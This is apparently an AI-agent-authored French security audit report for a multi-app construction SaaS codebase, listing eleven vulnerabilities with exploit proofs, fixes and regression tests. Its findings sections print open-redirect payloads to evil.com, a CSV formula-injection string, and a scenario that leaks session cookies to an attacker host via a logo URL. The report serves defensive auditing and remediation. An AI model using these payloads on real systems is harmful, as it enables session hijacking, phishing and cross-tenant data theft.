# ELSATIA — Multi-App Security Red Team & Hardening V2

| | |
|---|---|
| Date | 2026-09-28 |
| Base auditée | `integration/elsatia-canonical-train-v6` @ **`9102ec80`** (verdict d'origine `CANONICAL TRAIN V6 LOCALLY QUALIFIED`) — **base canonique demandée, vérifiée, jamais remplacée** |
| Branche de travail | `claude/elsatia-v6-security-redteam-v2` (fixes uniquement ; `integration/elsatia-canonical-train-v6` non modifiée) |
| Migrations partagées | **359** (V6 : 358 + 1 correctif `20260928000701`) · dernière V6 : `20260928000601` |
| Migrations Studio dédiées | **15** (V6 : 14 + 1 correctif `20260928130000`) |
| Moteur de preuve | PostgreSQL 16 réel + pgTAP 1.3, amorce `scripts/local-postgres-bootstrap` (sans Docker) ; Node 22 ; Vitest 4 |
| Actions distantes | **Aucune.** Aucun Supabase distant, aucune Preview, aucune Production, aucun Vercel, aucun Stripe/e-mail réel, aucun scan Internet, aucun merge vers `main`. |

## 0. Verdict

> ## **ELSATIA V6 SECURITY BLOCKERS FOUND**

L'audit a été mené sur **la vraie base canonique V6** (preuves de base §1). Il confirme les
propriétés de qualification V6 (§2) puis rapporte **11 findings** dont **1 CRITICAL et 4 HIGH**
prouvés par exploit local reproductible. **8 findings ont été corrigés** (correctif minimal, test
rouge → vert, non-régression prouvée) ; **3 findings** relèvent d'une décision produit ou d'un
chantier trop large pour un correctif « minimal et certain » et sont documentés avec un patch
recommandé (§7, DECISION_REQUIRED). Une section **faux positifs rejetés** (§8) recense les pistes
écartées après vérification de l'état final.

Le verdict est **BLOCKERS FOUND** parce que au moins un défaut CRITICAL exploitable
(fuite du jeton de session au tirage PDF) existait sur la base V6. Après application des correctifs
de cette branche, la base repasse toutes les portes locales sans régression (§6).

---

## 1. Preuves de base (obligatoire)

```
$ git remote -v
origin  https://github.com/julien-gregurec/Appli_BTP (fetch/push)

$ git fetch origin && git rev-parse origin/integration/elsatia-canonical-train-v6
9102ec80f577e980712b14ff3bd9ee4b2d6a4745

$ git rev-parse HEAD           # après checkout exact du V6
9102ec80f577e980712b14ff3bd9ee4b2d6a4745

$ git log -1 --format='%s'
docs(qualification): train canonique V6 — CANONICAL TRAIN V6 LOCALLY QUALIFIED
```

- **HEAD attendu `9102ec80` : atteint.** La branche canonique demandée était disponible après
  `git fetch origin` ; elle a été récupérée et « checkout » exactement. **À aucun moment `main`,
  l'ancien dépôt Liria, ou un autre HEAD n'a été audité.**
- **Migrations partagées : 358** sur la base V6, **dernière `20260928000601`** ✅ (attendu 358 /
  `…0601`).
- **Projet Studio dédié : 14 migrations** ✅.
- **Rebuild base neuve** (`scripts/local-postgres-bootstrap/rebuild_db.sh`) : **358/358 appliquées,
  0 erreur** (≈21 s).
- Le correctif de cette branche ajoute **1** migration partagée (→ 359) et **1** migration Studio
  dédiée (→ 15). L'audit lui-même raisonne sur **l'état final des 358 migrations V6**.

## 2. Confirmation des propriétés V6 (contre-vérification de la base)

- **pgTAP complet sur base neuve V6** : **152 fichiers, 143 propres, 4 457 assertions ok, 14 not_ok**
  — **identique au chiffre du rapport de convergence V6**. Les 9 fichiers non propres sont
  exactement ceux documentés par V6 (7 suites Studio du projet partagé « inscription fermée »,
  `platform_stripe_state_attestation_r72` = pgsodium réel absent de l'amorce,
  `elsatia_tools_cloud_sync_entitlement_closure_v1` = erreurs d'amorce). Aucune surprise.
- **Upgrade V5 → V6 avec données réalistes** (`scripts/qualification/upgrade-v5-v6.sh`) rejoué :
  **269 tables, 0 écart de lignes ; 91/91 empreintes métier identiques ; sonde RLS 51 utilisateurs /
  1 479 cellules, 0 écart ; 28/28 contrôles métier ; schéma + ACL identiques au fresh V6 (diff 0)**.
- **Chaîne Studio dédiée** (`apps/studio/scripts/dedicated-db-check.sh`) : **14 migrations, 0 table
  non-Studio**, toutes les suites dédiées propres.

La base V6 est donc **fidèlement celle qualifiée**. Les findings ci-dessous portent sur cet état
final, pas sur une migration intermédiaire.

## 3. Threat model

Profils construits et utilisés dans les sondes : `ANON`, `AUTHENTICATED_USER`, `ORG_A_MEMBER`,
`ORG_B_MEMBER`, `ORG_ADMIN`, `ORG_OWNER`, `SUSPENDED_USER`, `READ_ONLY_USER`,
`RESERVES_EXTERNAL_INVITEE`, `TOOLS_FREE/PRO_USER`, `RELEVE_PRO_USER`,
`STUDIO_USER`/`REVOKED_STUDIO_USER`, `STOLEN_SESSION`/`OLD_TOKEN`/`REPLAYED_TOKEN`,
`PUBLIC_LINK_USER`, `SERVICE_ROLE_SIMULATION`. Les sondes réelles ont surtout exercé
ANON / AUTH / ORG_A / ORG_B / SERVICE_ROLE contre PostgREST simulé (rôle `authenticated` +
`request.jwt.claims`), plus la relecture de code pour les profils liés à la session (STOLEN/OLD/
REPLAYED) et Stripe.

## 4. Findings

Sévérités : CRITICAL / HIGH / MEDIUM / LOW / INFO. « Statut » : **Corrigé** (test rouge→vert +
non-régression) ou **DECISION_REQUIRED** (patch recommandé, §7).

| # | Sévérité | Surface | Résumé | Statut |
|---|---|---|---|---|
| **F1** | **CRITICAL** | GP — tirage PDF | Fuite du **jeton de session** vers un hôte tiers via `entreprises.logo_url` | **Corrigé** |
| **F2** | **HIGH** | Réserves — auth | Redirection ouverte non authentifiée (`/auth/callback?next=`) | **Corrigé** |
| **F3** | **HIGH** | Réserves — auth | Redirection ouverte après connexion (`connexionAction`) | **Corrigé** |
| **F4** | **HIGH** | Réserves — RLS | Injection d'intervenant/plan dans le chantier d'un **autre tenant** | **Corrigé** |
| **F5** | **HIGH** | GP — e-mail | Injection HTML dans les e-mails de document (hameçonnage via l'expéditeur ELSATIA) | **Corrigé** |
| **F6** | **MEDIUM** | GP — auth | Contournement du validateur de redirection interne (segments-points) | **Corrigé** |
| **F7** | **MEDIUM** | GP — RPC | 2 fonctions SECURITY DEFINER lisant un autre tenant, exposées à `authenticated` | **Corrigé** |
| **F8** | **MEDIUM** | Studio — identité | Un jeton de passage **périmé** rétablit le droit d'écriture après révocation | **Corrigé** |
| **F9** | **MEDIUM** | GP — Storage | Confused deputy : `service_role` lit/supprime un chemin contrôlé par l'utilisateur | **Corrigé** |
| **F10** | **MEDIUM** | GP — export | Injection de formule CSV dans l'export comptable des notes de frais | **Corrigé** |
| **F11** | **HIGH** | GP — entitlements | Essai expiré / module non acheté non appliqués en base (REST direct) | **DECISION_REQUIRED** (§7) |

### F1 — CRITICAL — Fuite du jeton de session au tirage PDF (GP)

`src/lib/pdf/generer.ts` posait le cookie de la requête entrante via
`page.setExtraHTTPHeaders({ cookie })`. Puppeteer applique cet en-tête à **toutes** les requêtes de
la page, y compris les sous-ressources tierces. Or la page imprimée `/imprimer/(devis|facture)/[id]`
rend `<img src={entreprise.logo_url}>` (CSP `img-src https:`), et `entreprises.logo_url` est une
colonne **modifiable par tout membre disposant de `gerer_parametres`** (aucune contrainte sur la
valeur). Un administrateur délégué positionne `logo_url = https://attaquant.tld/x.png` ; au prochain
tirage PDF par n'importe qui de l'organisation (propriétaire, comptable, **ou support plateforme en
mode assistance**), Chromium envoie l'en-tête `Cookie` complet — donc les jetons Supabase
`sb-*-auth-token` (access + refresh) — à `attaquant.tld` → **prise de contrôle de session**. Vecteur
SSRF aveugle en prime.

*Preuve* : lecture de code confirmée. Fait notable : **l'application Réserves avait déjà corrigé ce
motif exact** (`apps/reserves/src/lib/pdf/generer.ts`, `page.setCookie(...cookiesPourUrl(...))` avec
un commentaire décrivant précisément cette vulnérabilité) ; le correctif n'avait jamais été propagé à
la GP.

*Correctif* : `src/lib/pdf/cookies.ts` (helper `cookiesPourUrl`) + `generer.ts` utilise désormais
`page.setCookie(...)` lié à l'URL du document — les cookies ne partent que vers l'origine du
document, jamais vers le logo. Test `src/lib/pdf/cookies.test.ts` (4 assertions).

### F2 / F3 — HIGH — Redirections ouvertes Réserves

`apps/reserves/src/app/auth/callback/route.ts` et `connexionAction` (`apps/reserves/src/app/actions.ts`)
validaient `next` par `valeur.startsWith("/") && !valeur.startsWith("//")`. Ce test laisse passer,
prouvé en Node contre l'origine `https://reserves.elsatia.fr` :

```
next="/%5Cevil.com"  -> https://evil.com/
next="/\evil.com"    -> https://evil.com/
next="/%09/evil.com" -> https://evil.com/
next="/%0A/evil.com" -> https://evil.com/
```

F2 est **non authentifié** (le callback redirige que `code` soit présent/valide ou non) ; F3 se
déclenche **après une connexion réussie** (hameçonnage d'identifiants sur `evil.com` déguisé en
« mot de passe erroné »).

*Correctif* : nouveau `apps/reserves/src/lib/redirection-sure.ts` (portage du validateur durci de
Colors : normalisation WHATWG + revérification de la sortie), branché dans le callback et dans
`cheminSur`. Test `redirection-sure.test.ts` (18 assertions, dont tous les payloads d'exploit).

### F4 — HIGH — Injection inter-tenant Réserves (chantier)

Les policies d'INSERT/UPDATE de `reserves_intervenants` et `reserves_plans` n'autorisent que sur
`entreprise_id` (`reserves_action_autorisee(entreprise_id, …)`) sans vérifier que `chantier_id`
appartient à la même organisation. **Exploit reproduit** : un admin Réserves de l'org A, qui ne voit
pas le chantier de B (`select count(*) = 0`), insère via PostgREST `reserves_intervenants
{entreprise_id: A, chantier_id: <chantier de B>}` → **accepté**. `reserves_intervenant_courant`
devient vrai pour l'entreprise intervenante d'A sur le chantier de B ; suit une fuite du chantier de
B et une contamination de la synchronisation GP (adoption d'intervenant sans filtre `entreprise_id`).

*Correctif* : migration `20260928000701` — trigger BEFORE INSERT/UPDATE
`reserves_garde_chantier_meme_tenant` sur les deux tables (refuse si
`reserves_chantiers.entreprise_id <> new.entreprise_id`, `errcode 42501`). Preuve après correctif :
l'insert inter-tenant lève « Le chantier appartient à une autre organisation » ; l'insert sur le
propre chantier d'A reste autorisé. pgTAP `security_redteam_v2_hardening_v1` (témoin négatif + positif).

### F5 — HIGH — Injection HTML dans les e-mails de document (GP)

`corpsHtmlEmailDocument` (`src/lib/email.ts`) interpolait `corpsTexte` (nom du client `nom_affiche`,
raison sociale, **message libre** `complementCorps`) et `lienDocument` dans du HTML **sans
échappement**. Un utilisateur (ou tout compte auto-inscrit) place `<a>`, un faux bouton ou du HTML
caché dans le nom du client / le message ; Brevo l'envoie depuis le domaine de la plateforme →
canal d'hameçonnage sur la réputation d'ELSATIA.

*Correctif* : `echapperHtml` appliqué au corps ; le lien n'est retenu que s'il est `http(s)` et est
échappé (contexte attribut). Test `src/lib/email.test.ts` (+2 assertions).

### F6 — MEDIUM — Contournement de `destinationInterneSure` (GP)

`src/lib/security/redirects.ts` vérifiait `//` sur l'entrée mais renvoyait `url.pathname` **sans le
revérifier**. Prouvé en Node : `/.//evil.com`, `/..//evil.com`, `/%2e//evil.com`, `/a/..//evil.com`
→ **`//evil.com`** (protocole-relatif). Utilisé par `confirmerCompteAction` (`/auth/confirm?next=`)
→ redirection ouverte après clic sur le domaine réel.

*Correctif* : revérification de la sortie normalisée (`//` et caractères ambigus) avant renvoi. Test
`src/lib/security/redirects.test.ts` (+4 payloads).

### F7 — MEDIUM — Fonctions SECURITY DEFINER sur-exposées (GP)

Sur les **665** fonctions SECURITY DEFINER de l'état final (toutes avec `search_path` épinglé), deux
sont accordées à `authenticated` **sans contrôle du tenant appelant** :

- `construire_client_snapshot(uuid,uuid,text)` — lit `clients` sous contrainte `entreprise_id =
  p_entreprise_id` **mais pas** d'appartenance de l'appelant. **Exploit reproduit** : l'org B appelle
  la RPC avec l'`entreprise_id` et un `client_id` d'A → renvoie l'identité complète du client d'A
  (nom, SIRET, e-mail, téléphone, adresse, contact). N'est appelée par l'application **que** par des
  triggers SECURITY DEFINER internes (capture d'identité).
- `capacite_stripe_operations_a_reprendre(integer)` — renvoie les opérations de capacité Stripe de
  **tous les tenants** (aucun filtre). N'est appelée que par le client admin (service_role) du
  cron/reconcile.

*Correctif* : migration `20260928000701` — `revoke execute … from authenticated` sur les deux
(service_role conservé pour le cron ; les triggers s'exécutent sous le propriétaire). Preuve après
correctif : `ERROR: permission denied for function construire_client_snapshot`. pgTAP inclus.

### F8 — MEDIUM — Jeton de passage périmé rétablissant l'accès (Studio)

`studio_identity_accept_handoff` (projet dédié) : la branche `elsif v_state.account = 'active'`
(atteinte quand `state_seq >= p_seq`) écrasait `granted`/`plan`/`valid_until` **même quand
`p_seq < state_seq`** — contredisant son propre commentaire (« il ne l'emporte que s'il est plus
récent »). Scénario : compte actif seq 6 (droit accordé) → `entitlement_changed` seq 7 (droit retiré)
→ re-présentation du jeton seq 6 dans sa fenêtre de validité (TTL 60 s + skew) → **droit rétabli**
jusqu'au prochain événement.

*Correctif* : migration dédiée `20260928130000` — la branche n'applique le jeton que si
`p_seq = state_seq` (rafraîchissement idempotent de la génération courante) ; un jeton périmé est
ignoré. `SET "studio.write_path"='identity'` préservé (garde d'écriture). pgTAP
`studio_identity_handoff_seq_guard` (témoin négatif seq 6 + positif seq 8).

### F9 — MEDIUM — Confused deputy Storage (GP)

`employes.{signature,photo,carte_btp}_storage_path` sont du texte libre modifiable par
`gerer_employes`. `signerDocumentMetierAction` téléchargeait `signature_storage_path` avec le
`service_role` ; `anonymiserEmployeAction` supprimait ces chemins avec le `service_role` — sans
vérifier le préfixe tenant/employé. Un membre pointe sa ligne vers `<autre-org>/<emp>/…` (chemin
connu) → lecture/suppression inter-tenant.

*Correctif* : validation `path.startsWith(`${entrepriseId}/${employeId}/`)` avant tout appel Storage
admin, dans `signatures-documents.ts` et `rgpd.ts`. Les uploads légitimes utilisent déjà exactement
ce préfixe (vérifié dans `employes.ts`), donc aucune régression fonctionnelle.

### F10 — MEDIUM — Injection de formule CSV (GP, notes de frais)

`celluleCsv` (`src/lib/expenses/export.ts`) n'avait **aucune** neutralisation de formule. Un salarié
saisit le fournisseur `=HYPERLINK("http://x",…)` ; le comptable ouvre `recapitulatif.csv` dans Excel
→ formule exécutée.

*Correctif* : préfixe apostrophe sur `= + - @ \t \r` en tête de cellule (aligné sur
`plateforme-annuaire-csv.ts`). Test `src/lib/expenses/export.test.ts` (+1).

## 5. Matrice SECURITY DEFINER (extrait)

État final V6 : **665** fonctions SECURITY DEFINER hors schémas système, **100 % avec `search_path`
épinglé**. Exécutables par `anon` : **25**, toutes des triggers (non appelables en RPC) sauf deux
fonctions à jeton dont le corps filtre sur le hash du token (`document_commercial_par_token`,
`reserves_invitation_consulter`) — **contrôle du token dans le corps, pas d'ID contrôlé par
l'appelant : sûres**. Exécutables par `authenticated` : les deux exceptions F7 (corrigées). Aucune
fonction mutante ouverte à `anon` sans justification.

## 6. Tests & non-régression

| Porte | Avant fixes (base V6) | Après fixes | Verdict |
|---|---|---|---|
| Rebuild base neuve | 358/358 | **359/359** (0 erreur) | ✅ |
| pgTAP complet (partagé) | 152 fic., **143 propres, 4 457 ok, 14 not_ok** | 153 fic., **144 propres, 4 466 ok, 14 not_ok** | ✅ **0 régression** (le +1 propre / +9 ok = la nouvelle suite ; mêmes 9 fichiers non propres) |
| pgTAP nouveau `security_redteam_v2_hardening_v1` | — | **9/9 propre** | ✅ |
| Chaîne Studio dédiée | 14 mig., conforme | **15 mig., conforme** (write_guard 63/0, nouveau seq guard 6/0, rgpd 71/0) | ✅ |
| `verify:migrations` | 358 · dédié 14 | **359 · dédié 15** | ✅ |
| Réserves Vitest | 186 | **204** (+18, nouveau validateur) | ✅ |
| GP Vitest (suites touchées) | — | **32/32** (redirects, cookies PDF, email, export) | ✅ |
| Reserves typecheck / tsc GP root | ✅ | ✅ | ✅ |
| ESLint fichiers touchés | ✅ | ✅ (0) | ✅ |

Chaque correctif suit la FIX POLICY : **test rouge (exploit) → correctif minimal → test vert →
non-régression** (pgTAP complet comparé fichier par fichier, aucun nouveau fichier non propre).

## 7. Findings ouverts — DECISION_REQUIRED / hardening (patch recommandé, non appliqué)

Corrigés uniquement les défauts prouvés dont le correctif est minimal et certain. Les points
suivants sont réels mais relèvent d'une décision produit ou d'un chantier à blast-radius trop large
pour un correctif « minimal » sûr sans arbitrage :

- **F11 — HIGH — Essai expiré / module non acheté non appliqués en base.** `est_membre_actif` /
  `a_permission` ne vérifient ni `abonnement_essai_fin` ni l'entitlement de module ; l'expiration
  d'essai et le blocage de module ne vivent que dans le middleware (`getContexteEntreprise`,
  proxy par préfixe de chemin). Un membre d'une organisation dont l'essai a expiré garde
  lecture/écriture sur toutes les données métier via **PostgREST direct** avec sa session.
  **DECISION_REQUIRED** : que doit-il advenir d'un essai expiré — blocage dur de toutes les données,
  ou accès facturation seul (comme une suspension, cf. §23 de la mission) ? `est_membre_actif` est
  au cœur de **639 policies** ; le modifier à l'aveugle risque de verrouiller des clients en cours de
  conversion. *Patch recommandé* : ajouter la condition d'essai à `est_membre_actif` (choix « accès
  facturation seul » aligné sur la suspension) **après** arbitrage produit, avec une passe upgrade +
  pgTAP dédiée. Corroboré par 2 agents indépendants.
- **`entreprise_active_id` sans `WITH CHECK`** (MEDIUM). La policy UPDATE de `utilisateurs` laisse
  pointer `entreprise_active_id` vers n'importe quelle organisation ; `contexte_abonnement_courant`
  (SECURITY DEFINER) fuit alors nom / `reference_interne` / statut d'abonnement du tenant visé.
  Impact limité (RLS bloque les données métier ; `permissionsUtilisateur` = [] hors membre). *Patch
  recommandé* : trigger BEFORE UPDATE exigeant `entreprise_active_id IS NULL OR` appartenance
  active OU support ; + jointure d'appartenance dans `contexte_abonnement_courant`. À valider contre
  le flux d'onboarding (création d'entreprise avant appartenance) — d'où non appliqué à l'aveugle.
- **`logo_url` / chemins Storage non contraints** (hardening, complément de F1/F9). Ajouter une
  contrainte `logo_url LIKE <préfixe entreprise-assets>` et des CHECK/trigger sur les colonnes
  `*_storage_path`. F1 et F9 sont déjà neutralisés côté application ; ceci est une défense en
  profondeur en base.
- **Sentry sans `beforeSend` / scrubbing d'URL** (MEDIUM, corroboré par 3 agents). `tracesSampleRate:
  0.1` capture des URLs à jeton (`/auth/confirm?token_hash=…`, `/document/<token>`, invitations
  Réserves). *Patch* : `beforeSend`/`beforeSendTransaction` masquant query + segments de token.
- **`/api/documents/partage/[token]/pdf` non authentifié, sans rate-limit, lance Chromium avant
  validation du token** (MEDIUM). DoS/coût + SSRF si l'hôte est spoofable hors Vercel. *Patch* :
  valider le token d'abord, rate-limiter, figer l'origine.
- **Import paie à secret global unique** (`PAYROLL_IMPORT_SECRET`) sélectionnant le tenant par
  `entreprise_reference` du corps (MEDIUM, 3 agents). *Patch* : credential par tenant/HMAC couvrant
  le corps + horodatage + ligne d'audit.
- **RPC service_role manquantes du train canonique** (service-role review) : plusieurs fonctions
  `*_service` (paie import, push, relances, reconciliation) n'existent que dans
  `docs/migrations-proposees/…` → fonctionnalités « fail-closed » (503/throw) mais annoncées
  qualifiées. À trancher : porter les migrations, ou retirer les appels.
- **Comparaisons de secret non constant-time** (`!==`) sur `cron/abonnements`,
  `cron/notifications-push`, `webhooks/notifications-push` (LOW). *Patch* : `timingSafeEqual`.
- **Divers LOW/hardening** : `celluleTexte`/`xlsx`/`csv-colors` ne couvrent pas `\t\r` en tête ;
  bucket `entreprise-assets` listable par tout `authenticated` (énumère les IDs d'entreprise) ;
  `tools-releves` accepte `image/svg+xml` (servi via URL signée `*.supabase.co`, impact faible) ;
  réutilisation de clé `BANK_DATA_ENCRYPTION_KEY` (HMAC state Powens) ; `admin.ts` GP sans
  `import "server-only"`.

## 8. Faux positifs rejetés (vérification de l'état final)

- **Redirections Colors / Studio / GP-login** : `cheminInterneSur` (Colors) et `safeStudioDestination`
  (allowlist regex) revérifient déjà la sortie normalisée ; le `next` du login GP est restreint à
  `/identity/*`. **Sûrs** — d'où le portage de ce motif vers Réserves (F2/F3).
- **URLs d'e-mail / Stripe / auth dérivées de l'environnement**, pas de l'en-tête `Host`
  (`NEXT_PUBLIC_APP_URL`, `TOOLS_APP_URL`, …). Le `x-forwarded-host` n'apparaît que dans le contrôle
  same-origin d'une route. **Pas d'usurpation d'hôte.**
- **Webhooks Stripe / Apple / Google** : signature HMAC/JWS sur corps brut, tolérance 300 s, mode
  live/test, dédup par clé d'événement, tenant recroisé en SQL, entitlement jamais accordé depuis la
  seule metadata (subscription relue). **Sûrs.**
- **Pont d'identité GP → Studio** : jeton POST (jamais dans l'URL), `jti` à usage unique atomique,
  nonce lié au cookie httpOnly, ES256 épinglé (`none`/HS256 refusés), TTL 60 s, destination
  allowlistée. **Sûr.**
- **Réserves — hôte suspendu → invité en lecture seule** (D-01) : double garde
  (`reserves_acteur_courant` + trigger `reserves_garde_hote_suspendu` sur toutes les tables hôtes),
  **rejeu hors-ligne couvert**. **Vérifié sûr.**
- **Suspension Tools ⇏ blocage GP** : facturation Tools par utilisateur
  (`tools_monetization_*`), sans toucher `entreprises.abonnement_statut`. **Per-app respecté.**
- **`document_partage_media_path` / partage public** : media lié au document du token, brouillons
  exclus. **Sûr.**
- **Storage (état final des 358 migrations)** : préfixe tenant
  `est_membre_actif((storage.foldername(name))[1]::uuid)` sur les buckets sensibles ; politiques
  anon prototypes retirées (drop dynamique migration `…078`). Les policies « path-column » sans
  préfixe (documents chantier/paie, signature) → **F9** (corrigé côté application).
- **Secrets** : aucun secret réel commité ; `.env*.example` = placeholders ; valeurs de test
  synthétiques (`sk_test_placeholder`, JWT construits à la volée) ; mock local
  (`.qualification-tools`) = valeurs de dev. **Aucun secret affiché en clair dans ce rapport.**

## 9. Limitations (remote proof remaining)

Comme pour V6, restent **NOT PROVEN localement** (hors périmètre autorisé) : GoTrue réel
(mot de passe/session/MFA, timebox de session), PostgREST réel (surface HTTP auto-générée),
pipeline Storage réel (upload/signature), `pgsodium` Ed25519 réel, Stripe Test/Portail réels,
e-mail réel. Les findings liés à la session (jeton volé/rejoué, timebox) reposent sur la lecture de
code, pas sur un GoTrue réel. Aucune Preview, Production, ni Vercel n'a été touché.

## 10. Correctifs livrés (fichiers)

- **App** : `src/lib/pdf/cookies.ts` (+test), `src/lib/pdf/generer.ts`,
  `src/lib/security/redirects.ts` (+test), `src/lib/email.ts` (+test),
  `src/lib/expenses/export.ts` (+test), `src/app/actions/signatures-documents.ts`,
  `src/app/actions/rgpd.ts`, `apps/reserves/src/lib/redirection-sure.ts` (+test),
  `apps/reserves/src/app/actions.ts`, `apps/reserves/src/app/auth/callback/route.ts`.
- **Base partagée** : `supabase/migrations/20260928000701_security_redteam_v2_hardening_v1.sql`
  (+ `supabase/tests/security_redteam_v2_hardening_v1.test.sql`).
- **Base Studio dédiée** :
  `apps/studio/supabase/migrations/20260928130000_studio_identity_handoff_seq_guard_v1.sql`
  (+ `apps/studio/supabase/tests/studio_identity_handoff_seq_guard.test.sql`,
  `apps/studio/supabase/migration-targets.json`).

*Aucune migration V6 existante n'a été modifiée ; `integration/elsatia-canonical-train-v6` n'a pas
été touchée. Les correctifs vivent sur `claude/elsatia-v6-security-redteam-v2`.*
